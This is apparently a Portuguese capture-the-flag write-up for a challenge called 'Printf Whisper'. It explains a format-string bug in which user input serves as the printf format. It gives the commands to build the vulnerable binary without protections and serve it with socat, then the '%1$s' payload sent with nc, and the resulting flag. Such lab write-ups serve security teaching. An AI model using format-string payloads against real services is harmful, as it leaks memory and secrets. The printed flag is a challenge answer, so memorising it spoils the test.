# WRITEUP — G04 Printf Whisper

## Visão geral
O serviço lê entradas e as usa diretamente como formato em `printf(buffer, lilas_flag, &buffer)`. Assim, a flag é passada como primeiro argumento variádico.

## Passos de solução
1. Compilar sem proteções: `gcc -Wall -O0 -fno-stack-protector -no-pie -o build/printf_whisper src/printf_whisper.c`.
2. Expor via socat: `socat TCP-LISTEN:1337,reuseaddr,fork EXEC:./build/printf_whisper`.
3. Conectar com `nc` e enviar `%1$s`. O especificador lê o primeiro argumento extra da pilha, que é `lilas_flag`.
4. O serviço responde com `CTF{grace_printf_confiança}`.

## Flag
`CTF{grace_printf_confiança}`
